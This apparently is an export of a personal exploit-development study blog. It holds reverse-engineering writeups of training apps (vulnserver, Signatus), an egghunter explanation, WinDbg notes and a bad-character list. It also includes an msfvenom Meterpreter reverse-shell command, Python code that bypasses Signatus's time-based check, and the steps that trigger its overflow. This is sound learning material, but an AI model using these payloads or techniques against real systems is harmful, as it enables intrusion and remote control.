[{"content":"","date":null,"permalink":"/","section":"","summary":"","title":""},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"Coming soon\u0026hellip;\n","date":"25 May 2024","permalink":"/posts/postsec/vulnserver_dep/","section":"Posts","summary":"Coming soon\u0026hellip;","title":"Exploit Dev POC DEP Bypass vulnserver.exe"},{"content":"","date":null,"permalink":"/tags/exploitdev/","section":"Tags","summary":"","title":"ExploitDev"},{"content":"","date":null,"permalink":"/posts/postsec/","section":"Posts","summary":"","title":"Offensive Security Posts"},{"content":"","date":null,"permalink":"/categories/offensivesecurity/","section":"Categories","summary":"","title":"OffensiveSecurity"},{"content":"","date":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"You can access my poc on vulnserver.exe for studying purpose.My github, I hope that help others if they are trying to develop or improve their skills through vulnserver.exe.\nThe link if you want to download vulnserver.exe and test on your own lab:\nvulnserver app If you haven\u0026rsquo;t checked yet please see:\nReverse Engineering Vulnserver.exe ","date":"25 May 2024","permalink":"/posts/postsec/vulnserver_poc/","section":"Posts","summary":"You can access my poc on vulnserver.","title":"Exploit Dev POC vulnserver.exe"},{"content":"What is egghunter ? Sometimes when developing an exploit we realize that we have a limited buffer to work and one of the solution is to store the shellcode somewhere else with a larger buffer area and have a small piece of code (aka egghunter) stored in the small area that will search for the shellcode (egg) located in the larger memory buffer. I will explain the egghunter assembly code. The first three instructions will store in edx the next page by performing the or operation then increasing it by 1 and save it into the stack with \u0026ldquo;push edx\u0026rdquo; instruction.\n00f6f96f 6681caff0f or dx,0FFFh 00f6f974 42 inc edx 00f6f975 52 push edx Now the next three instructions will move the hex value 0FFFFFE37 in eax, this is the negative value of 0x1C9. It has been used to avoid null bytes. What is 0x1C9 ? this is the system call value to invoke NtAccessCheckAndAlarm function, if the memory address we are checking is not valid, this function will return access violation which represents 0x5, the return value is stored in eax and we compare with 0x5.\n00f6f976 b837feffff mov eax,0FFFFFE37h 00f6f97b f7d8 neg eax 00f6f97d cd2e int 2Eh 00f6f97f 3c05 cmp al,5 Now the next two instructions, edx will restore(pop) the saved memory page previously in the stack and je instruction is evaluating the cmp instruction comparing the eax with 0x5 if equal, will jump back again to 0x00f6f96f memory address and will continue until a valid memory is found.\n00f6f981 5a pop edx 00f6f982 74eb je 00f6f96f The next 4 instructions, we move the string w00t into eax, we store the memory page address in edi and the scas instruction will compare the dword (4 bytes). If string is not found in the memory page we jump back to 0x00f6f974 memory address and increase page by one and continue. If we match we proceed to the next instruction.\n00f6f984 b877303074 mov eax,74303077h 00f6f989 89d7 mov edi,edx 00f6f98b af scas dword ptr es:[edi] 00f6f98c 75e6 jne 00f6f974 The next three instruction below will perform same operation as above by checking the next 4 bytes against the string \u0026ldquo;w00t\u0026rdquo;. if matches, we jmp edi (contains the memory address of our payload), if not we jump back again to 0x00f6f974 and increase memory page until we find the egg.\n00f6f98e af scas dword ptr es:[edi] 00f6f98f 75e3 jne 00f6f974 00f6f991 ffe7 jmp edi I hope that helps to understand the egghunter technique ðŸ˜„\n","date":"25 May 2024","permalink":"/posts/postsec/egghunter_explained/","section":"Posts","summary":"What is egghunter ?","title":"EggHunter Explained"},{"content":"I choose one more vulnerable application to perform reverse engineering and discover vulnerablities if you want to follow along you can download here vulnserver App .\nWhen reverse engineering the crucial part before starting is enumerating the application for entry points (locations where you can input data), for example TCP/UDP Ports, Files, Configuration Files, Windows Registry Keys etc\u0026hellip; after enumerating the target application on all possible entry points, you need to decide and pick one to start.\nSince this is a small application designed for you to learn exploit development, you will find quickly that the application is listening on port 9999 after running it and opening TCPView, you can download here sysintenal tools\nNow we need to send a dummy packet and analyze the code flow using a combination of static analysis technique and dynamic analysis. The tools I used is windbg debugger for dynamic analysis tool and IDA Free for static analysis. We need to know which function to hook, we can use IDA Free and open vulnserver.exe and see the imported function (imports tab). The function commonly used for networking is the recv function for TCP protocol.\nHooking the recv function, we just need to open windbg debugger and attach to process \u0026ldquo;vulnserver.exe\u0026rdquo; and set a breakpoint as showing below.\nbp ws2_32!recv Now we need to send a dummy packet, for that you can use this small piece of python code. You can run the code like: python poc-vulnserver.py IP Ex.: python poc-vulnserver.py 192.168.132.10\nimport socket import sys def main(): if len(sys.argv) != 2: print(\u0026#34;Usage: %s \u0026lt;ip_address\u0026gt;\\n\u0026#34; % (sys.argv[0])) sys.exit(1) server = sys.argv[1] port = 9999 buf = bytearray([0x41]*0x100) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((server,port)) s.send(buf) resp = s.recv(1024) print(\u0026#34;Response: \u0026#34;,resp) s.close() if __name__ == \u0026#39;__main__\u0026#39;: main() You can see below our breakpoint getting hit and the memory address for our buffer is at 0x006c33c8 which is empty right now after issuing the dd command to display data in a double word (4 bytes). Your memory address will probably be different.\nYou can use the pt command to stop at the return address of the current function and check the memory address 0x006c33c8 again and we should see our 0x41 values.\nNow next step is to single step using the p command and follow using IDA Free, you can download IDA here Installing IDA is very simple, after installing IDA you can open the vulnserver.exe with IDA Free.\nClick on \u0026ldquo;New Button\u0026rdquo; and open vulnserver.exe and wait to fully disassemble. Note.: Disassemble is the process of transforming machine code into assembler code (low level assembly language). Read More Here\nNow with windbg, you can enter the p command and hit enter. Now copy the memory address on the left that shows on the \u0026ldquo;sub esp,10h\u0026rdquo; instruction. Go to IDA and hit the \u0026ldquo;g\u0026rdquo; keyword on your keyboard to \u0026ldquo;Jump to address\u0026rdquo; and paste the addresss as showing below and click Ok. Note.: If the memory address doesn\u0026rsquo;t match in IDA, you can change, \u0026ldquo;Got to Edit -\u0026gt; Segments -\u0026gt; Rebase Program\u0026hellip;\u0026rdquo;. You can locate the base memory address by running the following command in windbg: lm m vulnserver. You can reach out to me if you have any question. If you are not seeing the address in IDA Free you can enable by going to \u0026ldquo;Options -\u0026gt; General -\u0026gt; Line prefixes (graph)\u0026rdquo; and click on OK button.\nNow we landed at memory address: 0x401958 in IDA Free and we can follow along with Windbg. By looking at Graph overview in IDA we see this function is quite large with a good amount of if and else condition.\nWe can continue to step through in Windbg debugger using the p command, we see at the address 0x00401961 it compares the size of our payload 0x100 against the value 0 and it checks if is less or equal to 0, we don\u0026rsquo;t take this jump and continue to the next branch.\nWe see a series of branches basically performing the same thing only changing the \u0026ldquo;offset Str2\u0026rdquo;, for example the one below has a string called \u0026ldquo;HELP \u0026quot; and our buffer is stored in eax later copied to the stack along with the \u0026ldquo;HELP \u0026quot; string as arguments for the function strncmp. the strncmp will compare first 4 bytes of our payload with the string \u0026ldquo;HELP \u0026quot; and if equal, we take false branch (red) color, if not equal the comparison is true so we take the green arrow.\nAfter reviewing the whole function we see the behaviour is the same, the first 4 bytes of our payload is compared against multiple strings which represents specific functionalities in the software. If the 4 bytes matches with the string supplied by our buffer the functionality is performed. What we need to do is to review each block for possible vulnerabilities and attempt to trigger via custom crafted packet.\nI found several functionalities vulnerable to buffer overflow due to the code not using the safe strcpy function which does not take the size in consideration only destination and source address are used if destination is larger than source address will result in writing out of bounds data into the buffer. I will show you only two examples.\nThe first string of our example that triggers the vulnerablity is \u0026ldquo;GTER \u0026quot; string which lead us to the vulnerable code path at 0x00402060, I renamed in IDA Free to \u0026ldquo;_vuln_strcpy\u0026rdquo; function. If you update the poc code above to send a string \u0026ldquo;GTER \u0026quot; followed by a long string you should be able to overwrite the return address and control EIP.\nThe second string is \u0026ldquo;KSTET \u0026quot; which triggers the code path to the vulnerable function which I renamed to \u0026ldquo;_vuln_strcpy2\u0026rdquo;.\nI hope that you enjoyed and this could help anybody trying to learn reverse engineering ðŸ˜„\n","date":"25 May 2024","permalink":"/posts/postsec/vulnserver_revereng01/","section":"Posts","summary":"I choose one more vulnerable application to perform reverse engineering and discover vulnerablities if you want to follow along you can download here vulnserver App .","title":"Reverse Engineering Vulnserver.exe"},{"content":"","date":null,"permalink":"/tags/reverseeng/","section":"Tags","summary":"","title":"ReverseEng"},{"content":"If you need to jump backwards to reach to your shellcode, we can use nasm_shell from msf to demonstrate.\nLets say we want to jump backwards 100 bytes (0x64) bytes, we first need to open the nasm_shell with following command below\nmsf-nasm_shell You type the follow command:\nnasm \u0026gt; jmp short -100 00000000 EB9A jmp short 0xffffff9c I hope that helps ðŸ˜‰\n","date":"21 May 2024","permalink":"/posts/postsec/nasm_shell_negativejmp/","section":"Posts","summary":"If you need to jump backwards to reach to your shellcode, we can use nasm_shell from msf to demonstrate.","title":"NASM Negative Jump (jump Backwards)"},{"content":"During exploit development sometimes we need to perform a short jump, we can use nasm_shell from msf to demonstrate.\nLets say we want to jump 12 (0xc) bytes, we first need to open the nasm_shell with following command below\nmsf-nasm_shell You type the follow command:\nnasm \u0026gt; jmp short 12 00000000 EB0A jmp short 0xc I hope that helps ðŸ˜‰\n","date":"21 May 2024","permalink":"/posts/postsec/nasm_shell_shortjmp/","section":"Posts","summary":"During exploit development sometimes we need to perform a short jump, we can use nasm_shell from msf to demonstrate.","title":"NASM Short Jump"},{"content":"You can access my poc on signatus.exe for studying purpose.My github, I hope that help others if they are trying to develop or improve their skills through signatus.exe.\nThe link if you want to download Signatus.exe and test on your own lab:\nbmddy My own Lab,Poc Screenshot - Meterpreter Reverse Shell If you haven\u0026rsquo;t checked yet please see:\nReverse Engineering Signatus.exe (bmdyy) - Part 1 Reverse Engineering Signatus.exe (bmdyy) - Part 2 ","date":"17 May 2024","permalink":"/posts/postsec/signatus_poc/","section":"Posts","summary":"You can access my poc on signatus.","title":"Signatus.exe (bmdyy) - Exploit Dev POC"},{"content":"Continuing the second part of my reverse engineering the signatus.exe bmddy. If you haven\u0026rsquo;t followed the first part, click here Reverse Engineering Signatus.exe (bmdyy) - Part 1\nIf you already read this 2nd part, the full poc I developed can be looked at my github repository Signatus.exe (bmdyy) - Exploit Dev POC\nAs discussed on part 1, we have to get a successful condition at jz instruction at 0x60AE13E5 memory address which compares the result of encrypt_timing_func + additional calculation against first 4 bytes of our payload, I already developed a function in Part-1 that will address this issue.\nNext we need to continue our reverse engineering analysis, a message is printed to the console saying \"\u003e correct ODT received.\". The sofware will make a call to WS2_32!recv and receive the next 4 bytes in our payload. Again after the call completes its compared against the returned value stored in eax against 0x0FFFFFFFFh (-1), the WS2_32!recv returns -1 if no data is received, if received, it returns the number of bytes received and store it in eax register. Next branch (0x60AE142C) will compare eax with 0x4, will jump to successful branch(red color) if the value is equal, otherwise will jump to unsuccessful (green arrow) and the program will print the failed message and continue to look for new incoming data. The program will take the succesful branch as we have data for the second 4 bytes. we should focus on function call 0x60AE1470 and I renamed in IDA Free to func_opcodes_analyze (0x60AE1470). The function will use the payload value at offset 0x8 in the payload as an opcode value that will be compared against multiple values and will perform an action if the opcode value matches.\nAfter reverse engineering the function I named to func_opcodes_analyze (0x60AE1470). I discovered the following valid opcodes:\nSignatus available Opcodes\n0x1 (0x60AE1107) -\u0026gt; Will append payload data to the file: c:\\Users\\Public\\signatus.log 0x2 (0x60AE11DB) -\u0026gt; Will read payload data from the file c:\\Users\\Public\\signatus.log 0x3 (0x60AE12A9) -\u0026gt; Will write payload data to the file c:\\Users\\Public\\signatus.log The out of bounds buffer memory corruption happens in the vfscanf function when reading data back from the file into the buffer, there is no size check before reading the data from the file which causes the program to write data beyond the buffer.\nTo trigger the vulnerability the following has to happen: Write to a file two times with large data using 0x1 opcode. Trigger a read operation by using 0x2 opcode instructing the program to read the data in the file back to program\u0026rsquo;s buffer Following the action above we will be able to overwrite SEH (Structure Exception Handler) and control EIP. The vulnerable function is located in the memory address 0x61AE123D\n","date":"16 May 2024","permalink":"/posts/postsec/signatus_revereng02/","section":"Posts","summary":"Continuing the second part of my reverse engineering the signatus.","title":"Reverse Engineering Signatus.exe (bmdyy) - Part 2"},{"content":"I am currently enrolled on OSED Course, I am taking a chance to practice more my reverse engineering skills and exploit development and bmddy wrote a program called Signatus and I will do a write up of my approach on reverse engineering the program. Please check Reverse Engineering Signatus.exe (bmdyy) - Part 2 if you already checked Part1.\nIf you have already read 1st part and 2nd part, the full poc I developed can be looked at my github Signatus.exe (bmdyy) - Exploit Dev POC\nMy approach was first finding entry points to feed input data where I can interact with the software and tracing the code with IDA Free (static analysis) and Windbg (Dynamic analysis). By executing the program we can see its listening on port 9999 (TCP).\nI like to write a small piece of python code to send a dummy packet and with the windbg debugger attached with a breakpoint on ws2_32!recv function.\nimport socket import sys def main(): if len(sys.argv) != 2: print(\u0026#34;Usage: %s \u0026lt;ip_address\u0026gt;\\n\u0026#34; % (sys.argv[0])) sys.exit(1) server = sys.argv[1] port = 9999 buf = bytearray[0x41]*0x100 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((server,port)) s.send(buf) s.close() if __name__ == \u0026#39;__main__\u0026#39;: main() How do I know the software uses ws2_32!recv function to consume the data ?\nYou can load Signatus.exe on IDA Free and look for the imported functions (Imports\u0026rsquo;s tab in IDA)\nAttaching the debugger and set a breakpoint on WS2_32!recv (bp WS2_32!recv) and sending a dummy packet with the python script above.\nWe can see that the program checks if data was received successfully after the WS2_32!recv function returned by comparing the return value in eax with 0FFFFFFFFh (-1 in decimal). We can see the comparison below at the address: 60AE135C. We passed the check, the next check it compares the return value with hard coded value of 0x4, also showing below.\nBecause the return value is equal to 0x4, we do not follow the successful branch (green), we follow the (red) arrow. The next branch is the one of my interest as it contains the functionality that will deny or allow us to utilize further functionality in the software. Understanding this piece is crucial to allow us to go down the correct path for the vulnerability.\nThere are two import point to understand the 0x60AE1399 (call ds:_time64) will get current timestamp in number of seconds elapsed since midnight (00:00:00), January 1, 1970 _time64. The result of _time64 will be passed as argument to a function at 0x60AE13A8 (I renamed this funtcion as: encrypt_timing_func). This function encrypt_timing_func will receive as first argument the _time64 and second argument 0x0.\nLooking inside the encrypt_timing_func function this piece of code will perform arithmetic against the value generated by _time64 function. We see hardcoded 0xa (ecx) and 0x0 (eax) is used as well as part of division.\nThe value returned from the function discussed is used after the function is returned in the multiplication, left shit and xor instructions below. The result is stored in edx and compared with edi, the edi contains the first 4 bytes of our payload. If edx and edi matches, it will take (true condition) green arrow. If the value in edi (first 4 bytes of our payload) doesn\u0026rsquo;t match, the program will end and continue to listen for new incoming packets (input).\nHere we can understand that the first 4 bytes of our payload need to be equal to the value in edx which contains the value transformed through _time64 by encrypt_timing_func function (0x60AE13A8) and extra aritchmetic calculation after function is returned starting at (0x60AE13AD).\nI wrote a function in python that will generate the correct value for the first 4 bytes of our payload.\nRecommendation.: Run your poc script in the same machine where signatus.exe is stored or you will need to sync the time between signatus.exe machine and the remote machine, any time delay the poc won\u0026rsquo;t work.\nBelow is the piece of encrypt_timing_func function I wrote in python. I will continue the reverse engineering in Reverse Engineering Signatus.exe (bmdyy) - Part 2 where I will continue the reverse engineering to discover the memory corruption vulnerability.\ndef reverse_timing(timing): ecx = 0xa # Hard coded 0xa eax = 0x0 # Hard coded 0x0 # xor edx, edx edx = 0 # div ecx edx = (eax % ecx) # Store the remainder in edx eax = int(eax / ecx) # we div, we use int because of floating number # mov ebx, eax ebx = eax # Timing eax = int(timing) # Timing in eax # div ecx edx = (eax % ecx) # Store the remainder in edx eax = int(eax/ecx) # we div, we use int because of floating number # mov edx, ebx edx = ebx # dec edi edi = 0 edi = edi-1 \u0026amp; 0xFFFFFFFF # movzx esi, al esi = eax \u0026amp; 0xFF # mov eax, esi eax = esi # imul eax, esi eax = (eax * esi) # mov ecx, eax ecx = eax # imul ecx, esi ecx = (eax*esi) # mov edx, ecx edx = ecx # imul ecx, esi ecx = (ecx*esi) # and edx, 0FFFFFF00h edx = (edx \u0026amp; 0x0FFFFFF00) # shl edx, 4 edx = edx \u0026lt;\u0026lt; 4 # or edx, eax edx = (edx | eax) # and edx, 0x0FFFFFFF0h edx = (edx \u0026amp; 0x0FFFFFFF0) # and ecx, 0FFFFF000h ecx = (ecx \u0026amp; 0x0FFFFF000) # shl ecx, 8 ecx = (ecx \u0026lt;\u0026lt; 8) \u0026amp; 0xFFFFFFFF # or edx, ecx edx = (edx | ecx) \u0026amp; 0xFFFFFFFF # shl edx, 4 edx = (edx \u0026lt;\u0026lt; 4) \u0026amp; 0xFFFFFFFF # or edx, esi edx = (edx | esi) \u0026amp; 0xFFFFFFFF # xor edx, 74829726h edx = edx ^ 0x74829726 return edx ","date":"15 May 2024","permalink":"/posts/postsec/signatus_revereng01/","section":"Posts","summary":"I am currently enrolled on OSED Course, I am taking a chance to practice more my reverse engineering skills and exploit development and bmddy wrote a program called Signatus and I will do a write up of my approach on reverse engineering the program.","title":"Reverse Engineering Signatus.exe (bmdyy) - Part 1"},{"content":"","date":null,"permalink":"/tags/maldev/","section":"Tags","summary":"","title":"Maldev"},{"content":"Good resources to learn Malware Analysis/Dev\nVx-Underground\nmodexp\nx86matthew\npre-empt\nReflectiveDllDllInjection\nmeterpreter source code\n5pider\nOLABS\n","date":"15 May 2024","permalink":"/posts/postsec/maldev_rsc/","section":"Posts","summary":"Good resources to learn Malware Analysis/Dev","title":"Maldev Resources (Offensive Security)"},{"content":"","date":null,"permalink":"/tags/debugger/","section":"Tags","summary":"","title":"debugger"},{"content":"The Ldr is one of the most important field in PEB, Ldr is a pointer to a PEB_LDR_DATA structure that contains information about the loaded modules for the process.\nIt\u0026rsquo;s useful when developing a customized shellcode during exploit developement to find the address of an already loaded module. Also useful for malware development to find an address of already loaded module dynamically.\ntypedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; ","date":"12 May 2024","permalink":"/posts/postsec/ldr_struct/","section":"Posts","summary":"The Ldr is one of the most important field in PEB, Ldr is a pointer to a PEB_LDR_DATA structure that contains information about the loaded modules for the process.","title":"Ldr field in PEB"},{"content":"","date":null,"permalink":"/tags/windowsinternal/","section":"Tags","summary":"","title":"WindowsInternal"},{"content":"A really good book as a reference when working with Windows Native API, the book is old, but still relevant.\nWindows NT/2000 Native API Reference from Nebbett, Gary ","date":"11 May 2024","permalink":"/posts/postsec/windows_native_api_ref/","section":"Posts","summary":"A really good book as a reference when working with Windows Native API, the book is old, but still relevant.","title":"Windows Native API Book Referece"},{"content":"If you need to reverse engineer the windows kernel, the vergilius\u0026rsquo;s project is handy with thousands of undocumented structure covering several windows versions.\nThe Vergilius\u0026rsquo;s Project covers both x32 and x64 architecture.\nVergilius\u0026rsquo;s Project Official link # Click here Vergilius Link to go to the official website\n","date":"11 May 2024","permalink":"/posts/postsec/windows-_kernel_struct/","section":"Posts","summary":"If you need to reverse engineer the windows kernel, the vergilius\u0026rsquo;s project is handy with thousands of undocumented structure covering several windows versions.","title":"Windows Kernel Undocumented Structures (VERGILIUS's Project)"},{"content":"Two references websites if you need to understand how a particular windows api (InvokeAPI) or undocument structures (ReactOS) works on Windows.\nPinvoke # Note: You can just google for specific api, for example: \u0026ldquo;virtualalloc pinvoke\u0026rdquo;\nClick here PInvoke Win32 Apis to go to the official website\nI found a second pinvoke website as well PInvoke.dev Apis\nReactOS # You can follow the link ReactOS Undocumented Structures\n","date":"11 May 2024","permalink":"/posts/postsec/wind32apis_winstructure/","section":"Posts","summary":"Two references websites if you need to understand how a particular windows api (InvokeAPI) or undocument structures (ReactOS) works on Windows.","title":"Win32 Api (pinvoke) \u0026 Windows Structures (ReactOS)"},{"content":"We can load external plugins to help during reverse engineering/exploit development.\nfor instance if you want to load pykd, you need to place the pykd.pyd in ext folder.\npykd.pyd # Copy pykd.pyd to C:\\Program Files (x86)\\Windows Kits\\8.0\\Debuggers\\x86\\winext or C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\winext\nExample in powershell:\ncopy-item pykd.pyd \u0026#34;C:\\Program Files (x86)\\Windows Kits\\8.0\\Debuggers\\x86\\winext\u0026#34; copy-item pykd.pyd \u0026#34;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\winext\u0026#34; You can use the windbg command to load the module\n.load pykd mona # You can follow the instructions here in the official link\n","date":"11 May 2024","permalink":"/posts/postsec/load_plugin_windbg/","section":"Posts","summary":"We can load external plugins to help during reverse engineering/exploit development.","title":"How to load external plugin windbg?"},{"content":"During exploit development sometimes we have a smaller buffer or part of buffer mangle the shellcode even when removing the bad characters. There are several solutions such as egghunter, build a custom shellcode and easiest option would try to use msfvenom with \u0026ndash;smallest parameter.\nExample:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -b \u0026#34;\\x00\\x0a\\x1a\u0026#34; -f py -v shellcode --smallest ","date":"4 May 2024","permalink":"/posts/postsec/smalled_shellcode/","section":"Posts","summary":"During exploit development sometimes we have a smaller buffer or part of buffer mangle the shellcode even when removing the bad characters.","title":"How to generate smallest shellcode ? (msfvenom)"},{"content":"List of bad chars # Useful during exploit developement to detect bad chars.\nNote.: I excluded the \\x00 byte usually considered as bad chars for copy operations like memcpy. The byte range goes \\x01 to \\xFF.\nbadchars = ( b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; b\u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; b\u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; b\u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; b\u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; b\u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; b\u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; b\u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; b\u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) ","date":"4 May 2024","permalink":"/posts/postsec/detect_badchars/","section":"Posts","summary":"List of bad chars # Useful during exploit developement to detect bad chars.","title":"Detect Bad Chars Exploit Development"},{"content":"","date":null,"permalink":"/tags/concept/","section":"Tags","summary":"","title":"concept"},{"content":"I found an exellent post on stackoverflow explaining the differences between opcode, bytecode, mnemonic, machine code and assembly.\nOriginal link: \u0026lsquo;StackOverFlow Link\u0026rsquo;\nOPCODE # It is a number interpreted by your machine(virtual or silicon) that represents the operation to perform\nBYTECODE # Same as machine code, except, its mostly used by a software based interpreter(like Java or CLR)\nMNEMONIC # English word MNEMONIC means \u0026ldquo;A device such as a pattern of letters, ideas, or associations that assists in remembering something.\u0026rdquo;. So, its usually used by assembly language programmers to remember the \u0026ldquo;OPERATIONS\u0026rdquo; a machine can do, like \u0026ldquo;ADD\u0026rdquo; and \u0026ldquo;MUL\u0026rdquo; and \u0026ldquo;MOV\u0026rdquo; etc. This is assembler specific.\nMACHINE CODE # It is the sequence of numbers that flip the switches in the computer on and off to perform a certain job of work - such as addition of numbers, branching, multiplication, etc etc. This is purely machine specific and well documented by the implementers of the processor.\nAssembly # There are two \u0026ldquo;assemblies\u0026rdquo; - one assembly program is a sequence of mnemonics and operands that are fed to an \u0026ldquo;assembler\u0026rdquo; which \u0026ldquo;assembles\u0026rdquo; the mnemonics and operands into executable machine code. Optionally a \u0026ldquo;linker\u0026rdquo; links the assemblies and produces an executable file.\n","date":"19 March 2024","permalink":"/posts/postsec/lowlevel_concept/","section":"Posts","summary":"I found an exellent post on stackoverflow explaining the differences between opcode, bytecode, mnemonic, machine code and assembly.","title":"Low level computer concept"},{"content":"","date":null,"permalink":"/tags/lowlevel/","section":"Tags","summary":"","title":"lowlevel"},{"content":"Using windbg we can check memory permission under Protect field.\n!vprot esp !vprot eip !vprot 00d13000 ","date":"19 March 2024","permalink":"/posts/postsec/windbg_mempermision_cmds/","section":"Posts","summary":"Using windbg we can check memory permission under Protect field.","title":"How to check Memory Permission in Windbg"},{"content":"Command below disable access violation and guard pages in Windbg\nRef.: Windbg Manual\nsxd av // Disable access violation sxd gp // Disable guard pages ","date":"19 March 2024","permalink":"/posts/postsec/windbg_guardpage_cmds/","section":"Posts","summary":"Command below disable access violation and guard pages in Windbg","title":"How to disable access violation/guardpage in windbg"},{"content":"All windbg commands here # Link to windgb manual\nAdd symbol # Go to File -\u0026gt; Symbol Search Path then add the path below\nsrv*c:\\symbols*https://msdl.microsoft.com/download/symbols Load the symbols # Note.: Attach to a process then run the command to load the symbols\n.reload /f Run the program # g Clear windbg screen # .cls Unassemble MNEMONIC instructions # The u command accepts memory address, range of memory address or symbol names. We can use \u0026ldquo;ub\u0026rdquo; command to disassemble by counting backwards.\nu module!function Read data from memory # db esp db 069fdcc db kernel32!WriteFile dw 069fdcc dd 069fdcc dq 069fdcc dW KERNELBASE+0X40 // show ascii value on the right dc KERNELBASE // show ascii character Control length to be displayed # The default is 0x80 bytes. The L parameter.\ndd esp L4 db esp L10 Display contents of address # sds (double word), dqs (Qword), dps (Pointer sized 4 byte or 8 byte depending on computer archtecture).\ndds esp L10 dds esp-10 L10 Derefence memory using poi # dd poi(esp) Dumping Structures from Memory # Display type the command is dt, the $teb is a pseudo register that provides address of the TEB\ndt ntdll!_TEB dt ntdll!_TEB @$teb ThreadLocalStoragePointer Display nested Structures from Memory # The -r will display nested structures, the $teb is the pseudo register that provides the address of the TEB\ndt -r ntdll!_TEB @$teb Calculate size of structure # ?? sizeof(ntdll!_TEB) Writing a value to Memory # We can use the edit command followed by size (similar to the display command).\ned esp 41414141 // we are writing a dword to esp ( 4 bytes ) ed esp 41414141 ea esp \u0026#34;Hello\u0026#34; // we can modify ascii values using ea, we write Hello to esp eu esp Address \u0026#34;String\u0026#34; // we can modify to unicode value using eu, we write to esp. Searching the memory space # The -d meanins dword memory address, 0 means beginning of address the L? Length to search, we enter 80000000 to search and followed by value 41414141. we can search for ascii string using the -a flag as well.\ns -d 0 L?80000000 41414141 s -a 0 L?80000000 \u0026#34;This program cannot be run in DOS mode\u0026#34; // this earch for the ascii string via -a flag Inspecting and Editing CPU Register in WinDbg # We can use \u0026ldquo;r\u0026rdquo; command to display all register or individual register. We can use \u0026ldquo;r\u0026rdquo; to modify register values\nr // list all register r ecx // list only ecx r ecx=41414141 // This edit ecx with value of 41414141 Software BreakPoints # bp kernel32!WriteFile bl // list the breakpoints g // let execution run Disable/Enable BreakPoints # bd \u0026lt;number\u0026gt; // Disable Breakpoints, get the number with bl be \u0026lt;number\u0026gt; // Enable Breakpoints, get the number with bl Clear/Delete BreakPoints # bc \u0026lt;number\u0026gt; // clear specific breakpoints bc * to clear all breakpoints Unresolved Function Breakpoints # Function not loaded in process memory and it has not been resolved.\nbu ole32!WriteStringStream Breakpoint-Based Actions # The command below break and print number of bytes from WriteFile function, %p display given value as a pointer.\nbp kernel32!WriteFile \u0026#34;.printf \\\u0026#34;The number of bytes written is: %p\\\u0026#34;, poi(esp + 0x0C); .echo;g\u0026#34; Conditional Breakpoints Actions # Command below breaks if number of bytes written is 4 otherwise continue execution.\nbp kernel32!WriteFile \u0026#34;.if (poi(esp + 0x0C) != 4) {gc} .else { .printf \\\u0026#34;The number of bytes written is 4\\\u0026#34;; .echo;}\u0026#34; Hardware Breakpoints # Hardware breakpoints are performed on processor level in the register, x86/x64 have only 4 registers reserved for hardware breakpoints. The access can be: e (execute), r (read), w (write) Example: ba \u0026lt;size_bytes_in_memory\u0026gt; \u0026lt;memory_address\u0026gt;\nba e 1 kernel32!WriteFile ba w 2 00c56330 // we are set hardware breakpoint write access of first 2 bytes on memory address 00c56330 Stepping through the code # We can use p (step over the calls) and t (step into the calls) and pt (go end of the function) and ph ( execute code until branching instruction is reached), This includes conditional or unconditional branches, functions calls and return instructions.\nThe pa \u0026lt;adddress\u0026gt; (step to Address) executes until reaches the specified memory address. Listing Modules and Symbols # We can use lm command do display loaded modules start/end addresses. 